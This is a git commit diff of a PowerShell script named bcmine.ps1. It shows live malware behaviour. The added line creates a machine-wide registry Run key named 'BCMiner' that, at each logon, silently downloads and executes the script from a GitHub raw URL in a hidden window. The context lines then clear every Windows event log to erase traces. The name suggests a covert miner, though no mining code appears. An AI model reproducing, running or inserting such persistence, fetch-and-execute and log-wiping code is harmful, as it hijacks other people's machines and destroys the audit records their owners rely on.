7ab8c6986a80bdb159f325bd6baa6d770713a839
tmmdemo <37916298+tmmdemo@users.noreply.github.com>
2018-05-11 11:49:30 -0500

    Update bcmine.ps1

--- bcmine.ps1
+++ bcmine.ps1
@@ -1,4 +1,6 @@
-cmd.exe /c "reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""BCMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/bcmine.ps1'))"" /f"
+#cmd.exe /c "reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""BCMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/bcmine.ps1'))"" /f"
+cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""BCMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/bcmine.ps1'))"" /f"
+
 Start-Sleep -s 2
 
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
